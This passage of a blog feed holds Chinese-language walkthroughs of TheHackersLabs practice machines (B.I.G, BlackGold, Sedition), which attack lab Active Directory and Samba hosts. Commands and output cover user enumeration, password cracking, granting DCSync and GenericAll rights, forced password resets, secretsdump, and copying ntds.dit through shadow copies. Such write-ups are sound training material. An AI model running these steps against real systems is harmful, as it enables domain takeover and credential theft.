-d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add genericAll 'CN=USERS,DC=BBR,DC=THL' song\n[+] song has now GenericAll on CN=USERS,DC=BBR,DC=THL\n```\n\n修改`administrator`密码，失败，因为`administrator` 是保护用户，不能直接修改密码\n\n### 链子 2\n\n我们直接控制域\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image13.png)\n\n```bash\n➜  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add genericAll 'DC=BBR,DC=THL' song                             \n[+] song has now GenericAll on DC=BBR,DC=THL\n```\n\n再添加一个`Dcsync`权限给自己\n\n```bash\n➜  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add dcsync song\n[+] song is now able to DCSync\n```\n\n`Dcsync`，使用 `secretsdump`\n\n```bash\nsecretsdump.py bbr.thl/song:'Passwordsave@'@192.168.212.4 -dc-ip 192.168.212.4\n```\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image14.png)\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image15.png)\n\n读取 `root.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat root.txt\n8e8xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## 总结\n\n难点在`Web`上，一时半会写不出来\n\n但是拿到`user`后就很简单了，一把梭哈",
            "url": "https://www.sunsetaction.top/2025/07/18/TheHackersLabsB I G",
            "title": "TheHackersLabs - B.I.G",
            "summary": "B.I.G https://labs.thehackerslabs.com/machine/6 Recon Port scan 使用 nmap 对端口进行扫描 枚举测试 SMB 匿名账户测试 WEB 目录扫描 HTTP 服务 两段歌词的来源 I keep it music music, I eat ...",
            "date_modified": "2025-07-18T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Windows",
                "Domain",
                "AD",
                "MISC",
                "AS_REPRoat"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/15/TheHackersLabsBlackGold",
            "content_html": "\n# BlackGold\n\n> https://labs.thehackerslabs.com/machine/9\n> \n\n![image.png](/post-images/TheHackersLabsBlackGold/image.png)\n\n## Recon\n\n端口扫描\n\n```bash\n➜  BlackGold nmap -sP 192.168.56.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:30 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00030s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00031s latency).\nMAC Address: 08:00:27:B8:0A:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.10\nHost is up (0.00038s latency).\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.5\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 28.11 seconds\n```\n\n```bash\n➜  BlackGold nmap -sT -min-rate 10000 -p- 192.168.56.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:32 CST\nNmap scan report for 192.168.56.10\nHost is up (0.00066s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n65047/tcp open  unknown\n65051/tcp open  unknown\n65052/tcp open  unknown\n65062/tcp open  unknown\n65071/tcp open  unknown\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 26.45 seconds\n```\n\n```bash\n➜  BlackGold nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:33 CST\nNmap scan report for 192.168.56.10\nHost is up (0.00038s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title:  Neptune\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-14 16:33:43Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: neptune.thl0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49664/tcp open  msrpc         Microsoft Windows RPC\n65047/tcp open  msrpc         Microsoft Windows RPC\n65051/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n65052/tcp open  msrpc         Microsoft Windows RPC\n65062/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-07-14T16:34:35\n|_  start_date: N/A\n|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:31:d9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: -2s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.38 ms 192.168.56.10\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 111.63 seconds\n```\n\n访问 `HTTP` 服务，通过`IIS`搭建\n\n![image.png](/post-images/TheHackersLabsBlackGold/image1.png)\n\n目录扫描，没发现什么可疑的文件夹\n\n```bash\n➜  BlackGold gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.10\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.10\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              zip,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 151] [--> http://192.168.56.10/images/]\n/docs                 (Status: 301) [Size: 149] [--> http://192.168.56.10/docs/]\n/Images               (Status: 301) [Size: 151] [--> http://192.168.56.10/Images/]\n/css                  (Status: 301) [Size: 148] [--> http://192.168.56.10/css/]\n/js                   (Status: 301) [Size: 147] [--> http://192.168.56.10/js/]\n/Docs                 (Status: 301) [Size: 149] [--> http://192.168.56.10/Docs/]\n/fonts                (Status: 301) [Size: 150] [--> http://192.168.56.10/fonts/]\n/IMAGES               (Status: 301) [Size: 151] [--> http://192.168.56.10/IMAGES/]\n/Fonts                (Status: 301) [Size: 150] [--> http://192.168.56.10/Fonts/]\n/CSS                  (Status: 301) [Size: 148] [--> http://192.168.56.10/CSS/]\n/JS                   (Status: 301) [Size: 147] [--> http://192.168.56.10/JS/]\n/DOCS                 (Status: 301) [Size: 149] [--> http://192.168.56.10/DOCS/]\nProgress: 661677 / 661680 (100.00%)\n===============================================================\nFinished\n===============================================================\n```\n\n页面拉到下面可以下载 `PDF` 文件\n\n![image.png](/post-images/TheHackersLabsBlackGold/image2.png)\n\n图片上两个`PDF`内容都都是无用的，我们检查一下`PDF`元信息\n\n```bash\n➜  BlackGold pdfinfo 2024-02-15.pdf \nTitle:           Certificado de Cumplimiento de Normativas Ambientales\nSubject:         \nKeywords:        \nAuthor:          James Clear\nCreator:         Neptune Oil & Gas\nProducer:        pdf-lib (https://github.com/Hopding/pdf-lib)\nCreationDate:    Thu Feb 15 11:00:00 2024 CST\nModDate:         \nCustom Metadata: no\nMetadata Stream: no\nTagged:          yes\nUserProperties:  no\nSuspects:        no\nForm:            none\nJavaScript:      no\nPages:           2\nEncrypted:       no\nPage size:       596 x 842 pts (A4)\nPage rot:        0\nFile size:       58258 bytes\nOptimized:       no\nPDF version:     1.7\n\n➜  BlackGold pdfinfo 2024-11-29.pdf \nTitle:           Informe de Sostenibilidad 2024\nSubject:         Informe sobre sostenibilidad y reducción de emisiones de CO2\nKeywords:        \nAuthor:          David Brown\nCreator:         Neptune Oil & Gas\nProducer:        ReportLab PDF Library - www.reportlab.com\nCreationDate:    Thu Feb 27 06:07:22 2025 CST\nModDate:         Thu Feb 27 06:07:22 2025 CST\nCustom Metadata: no\nMetadata Stream: no\nTagged:          no\nUserProperties:  no\nSuspects:        no\nForm:            none\nJavaScript:      no\nPages:           1\nEncrypted:       no\nPage size:       612 x 792 pts (letter)\nPage rot:        0\nFile size:       2110 bytes\nOptimized:       no\nPDF version:     1.5\n```\n\n作者信息中能得到两个用户名`David.Brown` 和 `James.Clear` ，可能是域用户\n\n## **AS_REP Roasting ❌**\n\n得到两个用户名，首先尝试一下 ****`AS_REP Roasting`\n\n```bash\n➜  BlackGold GetNPUsers.py -dc-ip 192.168.56.10 -dc-host neptune.thl nwptune.htl/ -usersfile users.txt\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)\n[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)\n```\n\n## 路径爆破\n\n观察到下载`PDF`的路径是：`http://192.168.56.10/docs/2024-11-29.pdf`\n\n是根据日期命名，我们尝试一下通过日期爆破一下\n\n![image.png](/post-images/TheHackersLabsBlackGold/image3.png)\n\n最后能爆破到`192`个`PDF`文档\n\n![image.png](/post-images/TheHackersLabsBlackGold/image4.png)\n\n这里使用`yakit`无法导出文件，所以还是需要写`python`脚本来爆破…\n\n```bash\nimport requests\nimport datetime\nimport os\n\n# --- 配置 ---\nHOST = \"192.168.56.10\"\nPORT = 80  # 根据需要修改 HTTP 端口\nBASE_URL = f\"http://{HOST}:{PORT}\"\n\nSTART_YEAR = 2023\nEND_YEAR = 2024  # 实际会检查到 2025 年\n\n# 保存下载文件的目录名\nOUTPUT_DIR = \"found_pdfs\"\n\n# --- 主逻辑 ---\ndef fuzz_and_download():\n    \"\"\"\n    遍历指定日期范围，尝试下载 PDF 文件。\n    如果服务器返回 200 状态码，则将文件保存到本地。\n    \"\"\"\n    print(f\"[*] 开始爆破目标: {BASE_URL}\")\n    print(f\"[*] 找到的 PDF 将保存在 ./{OUTPUT_DIR}/ 目录中\")\n\n    # 1. 如果输出目录不存在，则创建它\n    if not os.path.exists(OUTPUT_DIR):\n        os.makedirs(OUTPUT_DIR)\n        print(f\"[*] 已创建目录: {OUTPUT_DIR}\")\n\n    found_files_count = 0\n\n    # 2. 遍历所有可能的日期\n    for year in range(START_YEAR, END_YEAR + 1):\n        for month in range(1, 13):\n            for day in range(1, 32):\n                \n                # 验证日期是否有效，跳过如 2月30日 等\n                try:\n                    datetime.date(year, month, day)\n                except ValueError:\n                    continue\n\n                # 格式化日期和 URL\n                date_str = f\"{year}-{month:02d}-{day:02d}\"\n                filename = f\"{date_str}.pdf\"\n                url_path = f\"/docs/{filename}\"\n                full_url = f\"{BASE_URL}{url_path}\"\n\n                try:\n                    # 打印单行进度条，end='\\r' 让光标回到行首，实现动态更新\n                    print(f\"[*] 正在尝试: {full_url}   \", end='\\r')\n\n                    # 发送请求，stream=True 用于下载大文件，不会一次性读入内存\n                    response = requests.get(full_url, timeout=5, stream=True)\n\n                    # 3. 如果状态码为 200，则保存文件\n                    if response.status_code == 200:\n                        # 打印成功信息（在新的一行，避免被进度条覆盖）\n                        print(f\"\\n[+] 成功! 找到文件: {full_url} (状态码: 200)\")\n                        \n                        # 定义本地保存路径\n                        file_path = os.path.join(OUTPUT_DIR, filename)\n                        print(f\"    -> 正在保存到: {file_path}...\")\n\n                        # 以二进制写模式 ('wb') 打开文件并写入内容\n                        with open(file_path, 'wb') as f:\n                            for chunk in response.iter_content(chunk_size=8192):\n                                f.write(chunk)\n                        \n                        found_files_count += 1\n\n                except requests.exceptions.RequestException as e:\n                    # 如果发生连接错误，打印出来\n                    print(f\"\\n[!] 连接错误: {full_url} - {e}\")\n    \n    # 4. 结束时打印总结\n    print(\"\\n\\n[*] 爆破完成。\")\n    if found_files_count > 0:\n        print(f\"[*] 共下载了 {found_files_count} 个 PDF 文件到 '{OUTPUT_DIR}' 目录。\")\n    else:\n        print(\"[*] 未找到任何可用的文件。\")\n\nif __name__ == \"__main__\":\n    fuzz_and_download()\n```\n\n## 用户枚举\n\n将作者 `author` 和 `Creator` 信息截取出来\n\n```bash\nexiftool PDF/found_pdfs/* | grep -E 'Author|Creator' | grep -v 'Neptune Oil & Gas' | cut -d: -f 2 | sed 's/^ *//' | sort | uniq > users.txt\n```\n\n使用`kerbrute` 枚举\n\n```bash\n➜  BlackGold kerbrute -users users.txt -domain neptune.thl -dc-ip 192.168.56.10\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Valid user => Lucas.Miller\n[*] No passwords were discovered :'(\n```\n\n找到用户名`Lucas.Miller`\n\n 再尝试一下再`PDF`文件中读取有关`Lucas.Miller` 的\n\n```bash\n➜  BlackGold pdfgrep -i 'Lucas.Miller' PDF/found_pdfs/*     \nPDF/found_pdfs/2023-01-12.pdf:Estimado Lucas Miller,\nPDF/found_pdfs/2023-01-12.pdf:   ● Nombre de usuario (Usuario AD): lucas.miller@neptune.thl\n```\n\n![image.png](/post-images/TheHackersLabsBlackGold/image5.png)\n\n得到一串密码 `E@6q%TnR7UEQSXywr8^@`\n\n测试凭据是否有效\n\n```bash\n➜  BlackGold nxc smb neptune.thl -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@'\nSMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.10   445    DC01             [+] neptune.thl\\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ \n\n➜  BlackGold nxc ldap neptune.thl -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@'\nLDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)\nLDAP        192.168.56.10   389    DC01             [+] neptune.thl\\Lucas.Miller:E@6q%TnR7UEQSXywr8^@ \n```\n\n## 域分析\n\n上 `BloodHound` 分析一波\n\n```bash\n➜  BlackGold bloodhound-python -d 'neptune.thl' -ns 192.168.56.10 --zip -c All -dc 'DC01.neptune.thl' -u 'Lucas.Miller' -p 'E@6q%TnR7UEQSXywr8^@' \nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: neptune.thl\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC01.neptune.thl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.neptune.thl\nINFO: Found 8 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.neptune.thl\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250715122943_bloodhound.zip\n```\n\n`users` 组\n\n![image.png](/post-images/TheHackersLabsBlackGold/image6.png)\n\n观察了一下，用户`Victor Rodriguez` 的密码写在了`Description` 上\n\n![image.png](/post-images/TheHackersLabsBlackGold/image7.png)\n\n并且其属于`IT`组，在`SMB`中有一个`IT`的共享文件夹\n\n![image.png](/post-images/TheHackersLabsBlackGold/image8.png)\n\n远程管理组用户有两个，暂时是横向目标\n\n![image.png](/post-images/TheHackersLabsBlackGold/image9.png)\n\n## 横向移动\n\n### To emma.johnson\n\n测试上面的凭据\n\n```bash\n➜  BlackGold nxc smb neptune.thl -u 'Victor.Rodriguez' -p 'H5gVCzzZkzJ#wGsT8u1$'\nSMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.10   445    DC01             [+] neptune.thl\\Victor.Rodriguez:H5gVCzzZkzJ#wGsT8u1$\n```\n\n`SMB`里面能得到一个`powershell`脚本\n\n```bash\n➜  BlackGold smbclient //192.168.56.10/IT -U neptune.thl/Victor.Rodriguez%'H5gVCzzZkzJ#wGsT8u1$'            \nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Thu Feb 27 08:14:40 2025\n  ..                                DHS        0  Fri Feb 28 03:52:00 2025\n  Scripts                             D        0  Thu Feb 27 08:16:55 2025\n\n                10540543 blocks of size 4096. 7161242 blocks available\nsmb: \\> cd Scripts\\\nsmb: \\Scripts\\> ls\n  .                                   D        0  Thu Feb 27 08:16:55 2025\n  ..                                  D        0  Thu Feb 27 08:14:40 2025\n  backup.ps1                          A     1957  Thu Feb 27 08:20:11 2025\n\n                10540543 blocks of size 4096. 7161244 blocks available\nsmb: \\Scripts\\> get backup.ps1 \ngetting file \\Scripts\\backup.ps1 of size 1957 as backup.ps1 (382.2 KiloBytes/sec) (average 382.2 KiloBytes/sec)\n```\n\n打开后能得到用户`emma.johnson` 的凭据，密码：`sb9TVndq8N@tUVMmP2@#`\n\n![image.png](/post-images/TheHackersLabsBlackGold/image10.png)\n\n`emma.johnson` 是我们在上面看到在远程管理组里面的用户\n\n```bash\n➜  BlackGold nxc winrm neptune.thl -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'\nWINRM       192.168.56.10   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:neptune.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.10   5985   DC01             [+] neptune.thl\\emma.johnson:sb9TVndq8N@tUVMmP2@# (Pwn3d!)\n```\n\n![image.png](/post-images/TheHackersLabsBlackGold/image11.png)\n\n该用户能得到 `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Emma Johnson\\Desktop> type user.txt\na5xxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n### To thomas.brown\n\n当前用户权限\n\n![image.png](/post-images/TheHackersLabsBlackGold/image12.png)\n\n下一个用户包是`Thomas Brown` ，因为他属于`BACKUP OPERATORS`\n\n![image.png](/post-images/TheHackersLabsBlackGold/image13.png)\n\n重新导入下`BloodHound`的数据\n\n```bash\n\tbloodhound-python -d 'neptune.thl' -ns 192.168.56.10 --zip -c All -dc 'DC01.neptune.thl' -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#'\n```\n\n### GPO 滥用 **❌**\n\n能看到`emma.johnson` 有新的权限\n\n![image.png](/post-images/TheHackersLabsBlackGold/image14.png)\n\n该组策略影响很多用户\n\n![image.png](/post-images/TheHackersLabsBlackGold/image15.png)\n\n使用`bloodyAD`来实现\n\n赋予`emma.johnson`自己拥有对该 `GPO` 的 `genericAll` 权限\n\n```bash\n➜  BlackGold bloodyAD -d 'neptune.thl' --dc-ip 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' add genericAll 'CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL' 'emma.johnson'\n[+] emma.johnson has now GenericAll on CN={037ECEDE-7C98-4D00-95D5-4283F4271B0D},CN=POLICIES,CN=SYSTEM,DC=NEPTUNE,DC=THL\n```\n\n这里很奇怪，这里使用了好几个工具也无法利用\n\n```bash\npython3 GPOwned.py -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' -d 'neptune.thl' -dc-ip '192.168.56.10' -gpcmachine -gpoimmtask -name '{037ECEDE-7C98-4D00-95D5-4283F4271B0D}' -author 'neptune.thl\\Administrador' -taskname 'Beautiful IOC' -taskdescription 'Hello World' -dstpath 'c:\\windows\\system32\\calc.exe'\n```\n\n![image.png](/post-images/TheHackersLabsBlackGold/image16.png)\n\n最后看了`WP`发现人家的和我不一样\n\n### Force Change PassWord\n\n这里重新导入了一下机器，然后再次导入新的数据，就可以看到`emma.johnson`可以修改`thomas`的密码\n\n![image.png](/post-images/TheHackersLabsBlackGold/image17.png)\n\n通过 `BloodAD`修改密码\n\n```bash\n➜  BlackGold bloodyAD -d 'neptune.thl' --dc-ip 192.168.56.10 -u 'emma.johnson' -p 'sb9TVndq8N@tUVMmP2@#' set password thomas.brown Admin@123\n[+] Password changed successfully!\n```\n\n登录`thomas.brown`账户\n\n![image.png](/post-images/TheHackersLabsBlackGold/image18.png)\n\n### 转储 NTDS\n\n上面我们就知道`thomas.brown` 属于`BACKUP OPERATORS` 组\n\n`whoami`信息中也能看出来\n\n![image.png](/post-images/TheHackersLabsBlackGold/image19.png)\n\n利用：https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=backup%20op#using-diskshadowexe\n\n因为`winrm`是非交互会话，我们需要对其进行修改\n\n```bash\necho \"set context persistent nowriters\" > C:\\Windows\\Temp\\ntds_shadow.txt\necho \"add volume C: alias shadow_c\" >> C:\\Windows\\Temp\\ntds_shadow.txt\necho \"create\" >> C:\\Windows\\Temp\\ntds_shadow.txt\necho \"expose %shadow_c% Z:\" >> C:\\Windows\\Temp\\ntds_shadow.txt\ndiskshadow /s C:\\Windows\\Temp\\ntds_shadow.txt\n```\n\n```bash\nrobocopy /B Z:\\Windows\\NTDS\\ C:\\rev ntds.dit\nrobocopy /B Z:\\Windows\\System32\\config\\ C:\\rev SYSTEM\n```\n\n再通过 `secretdump` 转储出来\n\n![image.png](/post-images/TheHackersLabsBlackGold/image20.png)\n\n## 总结\n\n常规思路，除了有些坑",
            "url": "https://www.sunsetaction.top/2025/07/15/TheHackersLabsBlackGold",
            "title": "TheHackersLabs - BlackGold",
            "summary": "BlackGold https://labs.thehackerslabs.com/machine/9 Recon 端口扫描 访问 HTTP 服务，通过IIS搭建 目录扫描，没发现什么可疑的文件夹 页面拉到下面可以下载 PDF 文件 图片上两个PDF内容都都是无用的，我们检查一下PDF元信息 作者信...",
            "date_modified": "2025-07-15T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Windows",
                "NTDS",
                "exiftool",
                "Domain",
                "AD"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/14/TheHackersLabsSedition",
            "content_html": "\n# Sedition\n\n> https://labs.thehackerslabs.com/machine/117\n> \n\n![image.png](/post-images/TheHackersLabsSedition/image.png)\n\n## Recon\n\n```bash\n➜  Sedition nmap -sT -min-rate 10000 192.168.56.87      \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:30 CST\nNmap scan report for 192.168.56.87\nHost is up (0.0037s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT    STATE SERVICE\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.32 seconds\n```\n\n扫描出来是非常规端口\n\n```bash\n➜  Sedition nmap -sT -A -p 139,445 192.168.56.87        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:34 CST\nNmap scan report for 192.168.56.87\nHost is up (0.00049s latency).\n\nPORT    STATE SERVICE     VERSION\n139/tcp open  netbios-ssn Samba smbd 4\n445/tcp open  netbios-ssn Samba smbd 4\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\n\nHost script results:\n|_clock-skew: -3s\n| smb2-time: \n|   date: 2025-07-14T13:34:54\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n|_nbstat: NetBIOS name: SEDITION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.49 ms 192.168.56.87\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.50 seconds\n```\n\n没有`Web`端口，我们只能从`SMB`上手\n\n首先尝试使用匿名账户进行访问\n\n```bash\n➜  Sedition smbclient -L 192.168.56.87 -U anonymous\nPassword for [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        backup          Disk      \n        IPC$            IPC       IPC Service (Samba Server)\n        nobody          Disk      Home Directories\nReconnecting with SMB1 for workgroup listing.\nsmbXcli_negprot_smb1_done: No compatible protocol selected by server.\nProtocol negotiation to server 192.168.56.87 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE\nUnable to connect with SMB1 -- no workgroup available\n```\n\n`backup`里面有一个压缩包，下载\n\n![image.png](/post-images/TheHackersLabsSedition/image1.png)\n\n## ZIP Crack\n\n解压压缩包需要密码\n\n```bash\n➜  Sedition unzip secretito.zip  \nArchive:  secretito.zip\n[secretito.zip] password password: \n   skipping: password                incorrect password\n```\n\n`john`转换后爆破\n\n```bash\n➜  Sedition zip2john secretito.zip > ziphash.txt                                 \nver 1.0 efh 5455 efh 7875 secretito.zip/password PKZIP Encr: 2b chk, TS_chk, cmplen=34, decmplen=22, crc=F2E5967A ts=969D cs=969d type=0\n\n➜  Sedition john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt         \nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsebastian        (secretito.zip/password)     \n1g 0:00:00:00 DONE (2025-07-14 21:40) 50.00g/s 819200p/s 819200c/s 819200C/s 123456..cocoliso\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\n解压后得到一个密码 `elbunkermolagollon123`\n\n![image.png](/post-images/TheHackersLabsSedition/image2.png)\n\n这里尝试了很多用户名尝试登录`SMB`，但是都是失败了\n\n## 端口扫描 v2\n\n再枚举一下端口\n\nUDP\n\n```bash\n➜  Sedition nmap -sU -min-rate 5000 192.168.56.87\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:46 CST\nNmap scan report for 192.168.56.87\nHost is up (0.00022s latency).\nNot shown: 993 open|filtered udp ports (no-response)\nPORT      STATE  SERVICE\n137/udp   open   netbios-ns\n5353/udp  closed zeroconf\n17845/udp closed unknown\n25375/udp closed unknown\n41702/udp closed unknown\n46093/udp closed unknown\n51456/udp closed unknown\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.74 seconds\n```\n\nTCP 所有端口\n\n```bash\n➜  Sedition nmap -sT -min-rate 10000 -p- 192.168.56.87\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 21:48 CST\nNmap scan report for 192.168.56.87\nHost is up (0.00037s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n65535/tcp open  unknown\nMAC Address: 08:00:27:8B:04:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.75 seconds\n```\n\n多了个 `65535` ，扫描一下详细信息\n\n```bash\n➜  Sedition nmap -sT -A -p 65535 